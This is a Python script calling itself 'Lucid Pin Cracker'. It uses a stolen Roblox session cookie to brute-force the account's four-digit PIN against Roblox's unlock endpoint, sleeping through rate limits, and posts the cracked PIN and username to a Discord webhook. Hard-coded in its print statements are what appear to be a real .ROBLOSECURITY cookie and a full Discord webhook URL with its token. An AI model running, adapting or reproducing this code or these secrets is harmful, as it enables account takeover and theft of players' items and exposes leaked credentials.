import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_6ADCCFBE7D418BFB8D9F599CE300559DF2251AE7ABB4377C7037DE29AED7C36821A6946AEC5B91878496F6D63CE461C3C15F70CFE92C96A3DBFE1F2C07A1B47E4882BDC99FDAE33BE75233052C7386F10A8A01896455763A3C730E53BED03B8CBB093340D3D7A75A20B3D2EC5A32FD9FB1EAC08E5770BD491DECA922F3DE11188CD78F461465E4E8313E7F7C4C1BC8F540EC43E88515C0CD36B5B0D00FCB3448B36BAD3924796226D6633A702A1CDAF3C854B1C04C156739A63E6482E60433652A543D4F6B0FB859A8A8F4811BA1CEF7F75BAF731770B23EA993F68B1149FEE8B2F53ED4D97D8A5D9A35D2A4E346B7AFB6C8C45365A11AAF036BB3FCA3A688163CBA5D5D3635FEF087E7D55D4D3AB1656CFA9BB9C36AD2EC9018EF5C36AC9427B96B04CE3DCE85EB7CCF5F19C2280C0A1BE0753D2FB768101E4FFE993720A0CBD07F85822295D970B98E805C0C4A9A8C6EE817E4E54A1A25CB25010E7C51B6D218AE2DC37A3384396C155C90C461EC7CDBCF28C4')
cookie = input()
os.system("cls")
print('')
print('https://discord.com/api/webhooks/1004133705629048852/HtrrIy_sJgwzpIGu5qqjRcAGedBPzJetb45J_U7bkVr-ZFXduEg6Xb8ooj-HnBRQqHYC')
webhook = input()
os.system("cls")
print('')
print('y')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



